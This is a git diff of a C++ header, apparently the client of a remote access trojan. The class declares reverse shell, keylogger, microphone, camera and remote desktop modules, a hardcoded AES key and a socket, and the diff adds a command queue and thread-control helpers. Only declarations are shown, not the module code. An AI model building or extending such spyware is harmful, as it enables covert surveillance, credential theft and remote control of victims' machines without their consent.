@@ -17,25 +17,32 @@ class Cliente {
 		std::mutex sck_mutex;
 		std::mutex mtx_shell;
 		std::mutex mtx_running;
+		std::mutex mtx_queue;
+
+		std::thread p_thQueue;
 
 		unsigned char t_key[AES_KEY_LEN] = { 0x74, 0X48, 0X33, 0X2D, 0X4A, 0X5C, 0X2F, 0X61, 0X4E, 0X7C, 0X3C, 0X45, 0X72, 0X7B, 0X31, 0X33,
 								  0X33, 0X37, 0X7D, 0X2E, 0X7E, 0X40, 0X69, 0X6C, 0X65, 0X72, 0X61, 0x25, 0x25, 0x5D, 0x72, 0x5E };
 		ByteArray bKey;
 		void Init_Key();
 
-		ReverseShell* reverseSHELL = nullptr;
-		Mod_Mic* mod_Mic = nullptr;
-		mod_Keylogger* mod_Key = nullptr;
-		mod_Camera* mod_Cam = nullptr;
+		//Modulos
+		ReverseShell*      reverseSHELL   = nullptr;
+		Mod_Mic*           mod_Mic        = nullptr;
+		mod_Keylogger*     mod_Key        = nullptr;
+		mod_Camera*        mod_Cam        = nullptr;
 		mod_RemoteDesktop* mod_RemoteDesk = nullptr;
 
 		//Para recibir archivo (single)
 		FILE *fpArchivo = nullptr;
+
+		//Queue para comandos recibidos
+		std::queue<std::vector<char>> queue_Comandos;
 		
 	public:
 		SOCKET sckSocket = INVALID_SOCKET;
 
-		std::map<std::string, EnumComandos::Enum> Comandos = {
+		/*std::map<std::string, EnumComandos::Enum> Comandos = {
 			{"498", EnumComandos::INIT_PACKET},
 			{"499", EnumComandos::PONG},
 			{"500", EnumComandos::PING},
@@ -77,7 +84,7 @@ class Cliente {
 			{"543", EnumComandos::RD_Salida},
 			{"544", EnumComandos::RD_Update_Q},
 			{"545", EnumComandos::RD_Update_Vmouse}
-		};
+		};*/
 
 		Cliente();
 		~Cliente();
@@ -106,8 +113,19 @@ class Cliente {
 		void iniPacket();
 
 		void MainLoop();
+		void Process_Queue();
+		void Spawn_QueueMan();
+		void Procesar_Comando(std::vector<char>& cBuffer);
+		void DestroyClasses();
+		bool m_isRunning() {
+			std::unique_lock<std::mutex> lock(mtx_running);
+			return isRunning;
+		}
 
-		void ProcesarComando(char* const& pBuffer, int iSize);
+		void m_Stop() {
+			std::unique_lock<std::mutex> lock(mtx_running);
+			isRunning = false;
+		}
 
 		void charFree(char*& nBuffer, int pLen) {
 			if (nBuffer) {
